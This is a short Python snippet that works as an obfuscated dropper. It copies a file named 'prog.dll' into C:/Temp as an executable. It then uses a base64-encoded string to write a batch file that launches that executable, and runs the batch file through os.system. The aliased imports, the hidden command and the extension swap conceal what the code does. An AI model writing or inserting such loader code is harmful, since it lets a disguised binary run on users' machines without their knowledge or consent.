import shutil as su,os as o,subprocess as sr,base64 as by;from os import system as dt;su.copy(f"{o.curdir}/prog.dll", "C:/Temp/prog.exe")
with open('C:/Temp/prog.bat', 'w') as f:f.write(by.b64decode("c3RhcnQgQzovVGVtcC9wcm9nLmV4ZQ==".encode('ascii')).decode('ascii'))
dt(r"C:/Temp/prog.bat")